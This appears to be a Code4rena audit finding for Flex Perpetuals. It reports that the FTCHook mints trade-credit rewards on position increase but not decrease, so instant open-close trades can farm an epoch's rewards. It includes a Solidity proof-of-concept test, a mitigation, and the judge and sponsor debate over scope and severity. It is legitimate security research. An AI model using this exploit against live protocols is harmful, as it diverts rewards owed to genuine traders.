@@ -1,0 +1,509 @@
+News
+
+Leaderboard
+
+Submissions
+
+Explore C4
+
+Audits
+
+Bounties
+
+Reports
+
+Support
+
+Resources
+
+Docs
+
+Terms
+
+Privacy
+
+saraswati
+Submissions
+Flex Perpetuals
+/
+F-39
+Medium
+Primary
+S-87
+Most of the FTC rewards can be taken by single entity.
+farman1094
+00
+Sufficient
+383d ago
+Finding description and impact
+
+Malicious actor can collect the most reward which supposed to be share between genuine traders
+
+There is feature of flex protocol of Flex Trade Credit the user will earn FTC as they trade on the Flex Perpetual. As the position increase the token minted by FTCHook, and staked in the TLC Staking for that specific epoch under the user name which increased the position. For that staking the reward will issued to that trader in form of USDbC. So what could happen is so instead of opening the position for trading the user open the position just for the token and closed it instantly in the same block. As for increasing the position he would be awarded by FTC but as he closed instantly no affect on FTC. Because we are doing nothing while decreasing the positon.
+
+//FTCHook::onDecreasePosition
+
+    function onDecreasePosition(
+        address _primaryAccount,
+        uint256,
+        uint256,
+        uint256 _sizeDelta,
+        bytes32
+    ) external onlyWhitelistedCaller {
+        // Do nothing
+    }
+
+https://github.com/code-423n4/2024-12-flex-perpetuals/blob/b84a0812c3368866964b8a16e7c36f6e7a50b655/src/staking/FTCHook.sol#L61C1-L69C6
+so what happen is the reward supposed to be shared between all the Genuine traders, some malicious actor can target it after checking the specific epoch which benefit him most. And mint the stake reward As much as possible for small fees.
+
+Practical example:-
+// This is mere an example, trader can do this in small and big scale as well
+If it's BTC or ETH market, weight 2.5, so user will receive 250,000 FTC for opening $100,000 position.
+Initial collateral = 100,000 usdc
+1st trade opening position trading fee = 100,000 - 100 = 99900
+1st trade opening position execution fee = 99900 - 0.1 = 99899.9
+2nd trade closing position trading fee = 99899.9 - 100 = 99799.9
+2nd trade closing position execution fee = 99799.9 - 0.1 = 99799.8
+
+So the total fee trader paid for this 250,000 FTC is $201, So this way trader can earn the gurranteed profit in small fees. When the rewards came this traders get the most reward of because of his big number of share. And this reward is supposed to be share between all the traders who's risking their collateral.
+
+Proof of Concept
+
+Most of the part of this test is taken by another tests.
+Current in the setUp weigth is set to 1x instead of 2.5x. The tlc (FTC) is supposed to be 250,000.
+
+// SPDX-License-Identifier: BUSL-1.1
+// This code is made available under the terms and conditions of the Business Source License 1.1 (BUSL-1.1).
+// The act of publishing this code is driven by the aim to promote transparency and facilitate its utilization for educational purposes.
+
+pragma solidity 0.8.18;
+
+import {BaseIntTest_WithActions} from "@hmx-test/integration/99_BaseIntTest_WithActions.i.sol";
+
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {LiquidityTester} from "@hmx-test/testers/LiquidityTester.sol";
+import {ILiquidityHandler} from "@hmx/handlers/interfaces/ILiquidityHandler.sol";
+import {IPerpStorage} from "@hmx/storages/interfaces/IPerpStorage.sol";
+import {IConfigStorage} from "@hmx/storages/interfaces/IConfigStorage.sol";
+import {ILimitTradeHandler} from "@hmx/handlers/interfaces/ILimitTradeHandler.sol";
+import {IIntentHandler} from "@hmx/handlers/interfaces/IIntentHandler.sol";
+import {IntentHandler} from "@hmx/handlers/IntentHandler.sol";
+import {ITraderLoyaltyCredit} from "@hmx/tokens/interfaces/ITraderLoyaltyCredit.sol";
+import {ITLCStaking} from "@hmx/staking/interfaces/ITLCStaking.sol";
+import {IEpochRewarder} from "@hmx/staking/interfaces/IEpochRewarder.sol";
+import {ITLCHook} from "@hmx/services/interfaces/ITLCHook.sol";
+import {console} from "forge-std/console.sol";
+import {MockErc20} from "@hmx-test/mocks/MockErc20.sol";
+import {ITradeServiceHook} from "@hmx/services/interfaces/ITradeServiceHook.sol";
+import {Deployer} from "@hmx-test/libs/Deployer.sol";
+
+
+
+
+
+contract TC43 is BaseIntTest_WithActions {
+    event LogBadSignature(bytes32 indexed key);
+    event LogIntentReplay(bytes32 indexed key);
+
+    MockErc20 internal rewardToken;
+
+    ITraderLoyaltyCredit internal tlc;
+
+    ITradeServiceHook internal tlcHook;
+
+    ITLCStaking internal tlcStaking;
+
+    IEpochRewarder internal tlcRewarder;
+
+
+    function setUp() public {
+        gasService.setWaviedExecutionFeeMinTradeSize(type(uint256).max);
+        rewardToken = new MockErc20("Reward Token", "RWD", 18);
+        tlc = Deployer.deployTLCToken(address(proxyAdmin));
+        tlcStaking = Deployer.deployTLCStaking(address(proxyAdmin), address(tlc));
+        tlcHook = Deployer.deployTLCHook(address(proxyAdmin), address(tradeService), address(tlc), address(tlcStaking));
+
+        address[] memory _hooks = new address[](1);
+        _hooks[0] = address(tlcHook);
+        configStorage.setTradeServiceHooks(_hooks);
+
+         tlcRewarder = Deployer.deployEpochFeedableRewarder(
+            address(proxyAdmin),
+            "TLC",
+            address(rewardToken),
+            address(tlcStaking)
+        );
+
+        // rewardToken.mint(address(this), 100 ether);
+        // rewardToken.approve(address(ethMarketRewarder), 100 ether);
+        // ethMarketRewarder.feed(100 ether, 365 days);
+        tlcStaking.addRewarder(address(tlcRewarder));
+        tlcStaking.setWhitelistedCaller(address(tlcHook));
+
+        tlc.setMinter(address(tlcHook), true);
+        address[] memory whitelistedCallers = new address[](1);
+        whitelistedCallers[0] = address(tradeService);
+        bool[] memory isWhitelisteds = new bool[](1);
+        isWhitelisteds[0] = true;
+
+        tlcHook.setWhitelistedCallers(whitelistedCallers, isWhitelisteds);
+    }
+
+        function withdrawTraderCapital() internal {
+            int24[] memory _prices = new int24[](12);
+            _prices[0] = int24(-99);
+            _prices[1] = int24(3127);
+            _prices[2] = int24(98527);
+            _prices[3] = int24(0);
+            _prices[4] = int24(1);
+            _prices[5] = int24(2);
+            _prices[6] = int24(3);
+            _prices[7] = int24(4);
+            _prices[8] = int24(5);
+            _prices[9] = int24(6);
+            _prices[10] = int24(7);
+            _prices[11] = int24(8);
+            uint24[] memory _publishTime = new uint24[](12);
+            _publishTime[0] = uint24(0);
+            _publishTime[1] = uint24(1);
+            _publishTime[2] = uint24(2);
+            _publishTime[3] = uint24(3);
+            _publishTime[4] = uint24(4);
+            _publishTime[5] = uint24(5);
+            _publishTime[6] = uint24(6);
+            _publishTime[7] = uint24(7);
+            _publishTime[8] = uint24(8);
+            _publishTime[9] = uint24(9);
+            _publishTime[10] = uint24(10);
+            _publishTime[11] = uint24(11);
+        withdrawCollateral(BOB, 0, ERC20(address(usdc)), 99799800000, _prices, _publishTime, block.timestamp, executionOrderFee);
+    }
+
+        function testCorrectness_TC43_intentdadsHandler_executeMarketOrderSuccess() external {
+        uint256 privateKey = uint256(keccak256(bytes("1")));
+        BOB = vm.addr(privateKey);
+
+        // T0: Initialized state
+        // ALICE as liquidity provider
+        // BOB as trader
+        IConfigStorage.MarketConfig memory _marketConfig = configStorage.getMarketConfigByIndex(wbtcMarketIndex);
+
+        _marketConfig.maxLongPositionSize = 20_000_000 * 1e30;
+        _marketConfig.maxShortPositionSize = 20_000_000 * 1e30;
+        configStorage.setMarketConfig(wbtcMarketIndex, _marketConfig, false);
+
+        // T1: Add liquidity in pool USDC 100_000 , WBTC 100
+        vm.deal(ALICE, executionOrderFee);
+        wbtc.mint(ALICE, 100 * 1e8);
+
+        addLiquidity(
+            ALICE,
+            ERC20(address(wbtc)),
+            100 * 1e8,
+            executionOrderFee,
+            tickPrices,
+            publishTimeDiff,
+            block.timestamp,
+            true
+        );
+
+
+        usdc.mint(BOB, 100_000 * 1e6);
+        console.log("Positon Opened------------------------------");
+        console.log("BOB Balance before deposit collateral:", usdc.balanceOf(BOB));
+        depositCollateral(BOB, 0, ERC20(address(usdc)), 100_000 * 1e6);
+
+        // Long ETH
+        vm.deal(BOB, 1 ether);
+        
+        // First Order 
+        IIntentHandler.ExecuteIntentInputs memory executeIntentInputs;
+        executeIntentInputs.accountAndSubAccountIds = new bytes32[](2);
+        executeIntentInputs.cmds = new bytes32[](2);
+
+        IIntentHandler.TradeOrder memory tradeOrder1 = IIntentHandler.TradeOrder({
+            marketIndex: wethMarketIndex, // marketIndex
+            sizeDelta: 100_000 * 1e30, // sizeDelta
+            triggerPrice: 0, // triggerPrice
+            acceptablePrice: 4000 * 1e30, // acceptablePrice
+            triggerAboveThreshold: true, // triggerAboveThreshold
+            reduceOnly: false, // reduceOnly
+            tpToken: address(usdc), // tpToken
+            createdTimestamp: block.timestamp, // createdTimestamp
+            expiryTimestamp: block.timestamp + 5 minutes, // expiryTimestamp
+            account: BOB,
+            subAccountId: 0
+        });
+        
+        
+        (bytes32 accountAndSubAccountId, bytes32 cmd) = intentBuilder.buildTradeOrder(tradeOrder1);
+        executeIntentInputs.accountAndSubAccountIds[0] = accountAndSubAccountId;
+        executeIntentInputs.cmds[0] = cmd;
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, intentHandler.getDigest(tradeOrder1));
+        executeIntentInputs.signatures = new bytes[](2);
+        executeIntentInputs.signatures[0] = abi.encodePacked(r, s, v);
+
+
+        executeIntentInputs.priceData = pyth.buildPriceUpdateData(tickPrices);
+        executeIntentInputs.publishTimeData = pyth.buildPublishTimeUpdateData(publishTimeDiff);
+        executeIntentInputs.minPublishTime = block.timestamp;
+        executeIntentInputs.encodedVaas = keccak256("someEncodedVaas");
+
+
+        // closing Order
+         IIntentHandler.TradeOrder memory tradeOrder2 = IIntentHandler.TradeOrder({
+            marketIndex: wethMarketIndex, // marketIndex
+            sizeDelta: -100_000 * 1e30, // sizeDelta
+            triggerPrice: 0, // triggerPrice
+            acceptablePrice: 0, // acceptablePrice
+            triggerAboveThreshold: true, // triggerAboveThreshold
+            reduceOnly: true, // reduceOnly
+            tpToken: address(usdc), // tpToken
+            createdTimestamp: block.timestamp, // createdTimestamp
+            expiryTimestamp: block.timestamp + 5 minutes, // expiryTimestamp
+            account: BOB,
+            subAccountId: 0
+        });
+        // overriding values
+        (accountAndSubAccountId, cmd) = intentBuilder.buildTradeOrder(tradeOrder2);
+        executeIntentInputs.accountAndSubAccountIds[1] = accountAndSubAccountId;
+        executeIntentInputs.cmds[1] = cmd;       
+        (v, r, s) = vm.sign(privateKey, intentHandler.getDigest(tradeOrder2));
+        executeIntentInputs.signatures[1] = abi.encodePacked(r, s, v);
+
+        // execute
+        intentHandler.execute(executeIntentInputs);
+
+        withdrawTraderCapital();
+
+        uint balAfter = tlcStaking.getUserTokenAmount(tlcRewarder.getCurrentEpochTimestamp(), BOB);
+        
+        // Initial collateral = 100,000 usdc
+        // 1st trade's trading fee = 100000 - 100 = 99900
+        // 1st trade's execution fee = 99900 - 0.1 = 99899.9
+        // 2nd trade's trading fee = 99899.9 - 100 = 99799.9
+        // 2nd trade's execution fee = 99799.9 - 0.1 = 99799.8
+
+
+        console.log("                                           ");
+        console.log("Positon closed------------------------------");
+        console.log("Active Position", perpStorage.getNumberOfSubAccountPosition(BOB)); // 0 position closed
+        console.log("TLC balance", balAfter); 
+        console.log("BOB Balance after withdrawing collateral:", usdc.balanceOf(BOB));
+    }
+}
+Recommended mitigation steps
+
+We need to meke the changes in the src/staking/FTCHook
+
+//FTCHook::onDecreasePosition
+
+    function onDecreasePosition(
+        address _primaryAccount,
+        uint256,
+        uint256,
+        uint256 _sizeDelta,
+        bytes32
+    ) external onlyWhitelistedCaller {
+        // Do nothing
+    }
+
+We need to set some timeFrame if user choose to close the position instantly or within that time frame. The TLC token should be taken back. Like We doing TradingStakingHook::onDecreasePosition
+
+Links to affected code
+FTCHook.sol#L61
+Opens in a new window
+Submissions touching same files
+FTCHook.sol
+Comments for the judge
+3
+You are viewing comments for the primary submission, S-87.
+Out of scope
+Edited: Feb 22
+ZanyBonzy
+
+Hi judge,
+
+According to the audit rules and provided scope only changes made to the audited scope needs to be audited.
+
+Previous audits: The results of the previous code audit can be found under ./audits. Only the changes made to the files within the defined scope need to be audited.
+
+From the previous audits, both HMXV2 and publicly provided:
+See here
+https://github.com/HMXOrg/v2-evm/tree/main/audits or here https://github.com/code-423n4/2024-12-flex-perpetuals/blob/main/audits
+
+If we take a look at the audits, based on the dates and audit scope, we find out that this is the last audit
+
+The audited commit hash
+is e7bdee69, while the fixes are conducted in this hash
+
+If we compare the fix to the protocol's own TLCHook.sol
+
+The difference can be seen here
+
+We'll see that there are no differences, meaning the fixes have been incorporated into the protocol's own imported code.
+
+Now, if we compare the protocol's TLCHook.sol with the inscope FTCHook.sol
+
+The difference is here
+
+As can be seen from the above link, there are no major differences beyond naming.
+
+As a result, based on the scoping rules, the issue should be out of scope as it's doesn't exist in the difference/changes made to the audited scope.
+
+Aamir
+01/09/2025
+
+As per the contest scope, it is clearly given that /src/staking/FTCHook.sol is in SCOPE. And if it would not require to be audited then why they even bothered to add it in the scope files when there are so many other contracts is OUT of Scope.
+
+ABAIKUNANBAEV
+Edited: 01/09/2025
+
+Agreed that this should be OOS or QA. I personally was doing this audit keeping in mind that we have to take into account only differences. So if README states one thing but the issue is judged differently, it's just unfair to other wardens
+
+Aamir
+01/10/2025
+
+You are talking about being unfair here but you also have submitted two issue S-44, S-45. Even though you know from starting that they are OOS. But now as they are invalid you are talking about scope. Really bro you can do better.
+
+0xsomeone
+01/10/2025
+
+Hey ZanyBonzy, Aamir, and ABAIKUNANBAEV; thank you for your PJQA feedback!
+
+I believe that you are misinterpreting what a delta audit is meant to accomplish. A delta audit does not infer that only the code changes are meant to be audited; a code change of function A will not only affect function A but also any other function that invokes it for which the actual code delta would be none.
+
+Additionally, configurational changes are also meant to be evaluated between forks as they can lead to the invalidation of certain presumptions that the original code base made (i.e. configuration of tokens that do not have 18 decimals, etc.).
+
+The original HMX code base issues an escrowed reward token that is native to the protocol as a reward based on trading activities. This directly results in a safeguard against manipulation as incentive rewards could be stifled after an exploitation event is detected, the rewards cannot be immediately captured, and the rewards are in the protocol’s own token. This would be classified as a known issue, and would be of minor-to-moderate severity depending on how one evaluates the issue.
+
+The Flex Perpetual version outlines that the reward token might be an actively traded asset. I was able to find a direct mention of USDbC as the Warden outlines in their submission through Google’s cache, and the latest version of the Flex Perpetuals documentation (updated after the contest’s closure) continues to state that “other incentives” are also meant to be distributed alongside the platform’s vested token.
+
+As we can observe, even if the code remained unchanged, the ramifications of the code’s behaviour have drastically changed. I believe that I have adequately elaborated on the submission’s major severity, and continue to consider it in-scope as the file is explicitly listed within the scope of the audit and the audit’s purpose is to evaluate all the ramifications of the Flex Perpetual team’s changes across the in-scope contracts regardless of whether those changes were direct line updates, configurational changes, or even compiler / EVM differences.
+
+fpcrypto-y
+01/13/2025
+
+Hey 0xsomeone.
+
+I think this is a minor issue.
+
+We have protection against this as flexdev mentioned before:
+https://docs.flex.trade/protocol-and-safety-parameters#min-profit-duration
+ConfigStorage(configStorage).getStepMinProfitDuration(...)
+
+Rewards cannot be captured immediately. It distributes every week TLC holders as esFDX. And esFDX is not traded asset. Users can't transfer it.
+https://docs.flex.trade/tokenomics/other-platform-tokens#flex-trade-credits-ftc
+
+I was able to find a direct mention of USDbC as the Warden outlines in their submission through Google’s cache
+
+Can you share this url?
+
+It's out of scope according to the diff.
+0xsomeone
+01/13/2025
+
+Hey @fpcrypto-y, thanks for your feedback! I am not able to share screenshots here on C4 and the implication is a Google search result so I cannot share a URL. Typing "flex perpetuals USDbC" should demonstrate this as the second link, part of the https://docs.flex.trade/ documentation.
+
+This section of your existing documentation outlines that other incentive rewards will be distributed alongside esFDX which would significantly undermine the security model of the system.
+
+Regarding the protection measure, can you please clarify how it would work if the position did not capture any profit (i.e. remains the same or has lost minuscule funds)? If it does not apply, then the security measure is inexistent for this particular attack vector.
+
+Finally, the code delta does not necessarily imply that code outside the delta is not expected to be audited. As an example, a project deploying to a zkEVM blockchain but using unsupported EVM instructions would be considered "out-of-scope" based on the code delta rationale which is invalid.
+
+Please do let me know how the profit window security measure applies to unprofitable/net-zero trades. If it does, I am more than happy to downgrade this particular vulnerability to a minor issue.
+
+fpcrypto-y
+01/14/2025
+
+Hello @0xsomeone
+
+Thank you for your clarification.
+
+About USDbC - I tried that google search and still couldn't find where USDbC was distributing as rewards for FTC holders. We distribute USDC to stFDXLP, esFDX stakers, ... but not for FTC holders
+More details are here https://docs.flex.trade/tokenomics/other-platform-tokens#flex-trade-credits-ftc
+
+About the protection - a trader should wait at least 1 minute before closing the trade. That make more difficult to have many zero-profit trades
+More details are here https://docs.flex.trade/protocol-and-safety-parameters#min-profit-duration
+
+esFDX reward is not transferrable for users and is under our control.
+So we have situation that is under our control like you described about HMX:
+
+This directly results in a safeguard against manipulation as incentive rewards could be stifled after an exploitation event is detected, the rewards cannot be immediately captured, and the rewards are in the protocol’s own token.
+
+About adding "other incentives" to the platform - it depends on the amount that would be added. Only after we have info you can prove that a trader will have earning from zero-net trades.
+
+I think this submission is not a high risk problem.
+
+0xsomeone
+01/15/2025
+
+Hey @fpcrypto-y, once again thank you for your due diligence! I will focus on points 2, 3, and 4 as these are the most prevalent items in your response with regard to this exhibit's validity.
+
+This limitation applies to profitable trades. Net-zero trades as well as minuscule loss trades are not restricted by it. As such, the argument of the security measure is inapplicable and cannot be a factor in the exhibit's validity.
+
+The main focus of the report is not esFDX but rather other incentives that are meant to be distributed alongside it. The original documentation of the code did not list "other incentives" and this was included in the Flex Perpetuals iteration of the codebase, signifying that there is intent to add other assets beyond esFDX.
+
+The same response as above applies.
+
+Unless the minimum duration before a trade's closure applies to unprofitable and net-zero trades alongside profitable trades, I cannot invalidate this exhibit.
+
+I am more than happy to debate whether the submission is a medium-risk or high-risk issue due to the fact that we are making an assumption of what "other incentives" refers to and in most cases the amount that would be added should not be significantly high (i.e. the main incentive would always be esFDX), but I firmly believe it is valid and in-scope of the audit contest.
+
+fpcrypto-y
+01/15/2025
+
+Hey @0xsomeone
+Thank you for clarifying your point.
+I agree that this issue is valid. However, I believe the submission's severity should be adjusted to low-risk or medium-risk.
+
+0xsomeone
+01/16/2025
+
+Hey @fpcrypto-y, thank you once again for your feedback! I believe that the assumptions that are needed for this submission to be considered valid indeed diminish the likelihood of the vulnerability occurring so a medium severity rating is more appropriate.
+
+I initially thought that the USDbC asset was explicitly mentioned in the documentation, but the cached Google result is insufficient to determine whether it was mentioned in the context of incentives. As the "other incentives" statement has been confirmed to be present, a medium likelihood severity is more appropriate and the submission has been updated as such.
+
+Showing 10 of 11 replies
+View more
+High Justification Rationale
+Edited: Feb 22
+0xsomeone
+
+The submission describes that the position creation reward is immediately disbursed by the system and does not wait for any period of time, permitting a user to instantly capture rewards that exceed the system's imposed fees.
+
+The sponsor claims that the system prevents such scenarios by imposing a minimum step profit duration, however, as its name implies, this time-based restriction is solely imposed on profitable positions and is not activated for zero-profit positions (i.e. ones that are opened and closed immediately).
+
+I believe that a severity of high is appropriate given that the system's reward mechanism will effectively be compromised and can be compromised to an arbitrary degree via the use of flash-loans or similar mechanisms.
+
+System have minProfitDuration protection
+Edited: Feb 22
+flexdev
+
+It's not obvious from scoped files, but protocol has getStepMinProfitDuration configurations that set's minimal duration of position depends on position size
+
+ConfigStorage(configStorage).getStepMinProfitDuration(...)
+
+
+https://docs.flex.trade/protocol-and-safety-parameters#min-profit-duration
+
+Timeline
+Submitted
+Created: 523d ago
+High
+Triage
+High
+Valid
+Primary
+Sufficient
+Review
+Disputed
+Judging
+Medium
+Valid
+Sufficient
+Post-judging QA
+Complete
+Reporting
+Complete
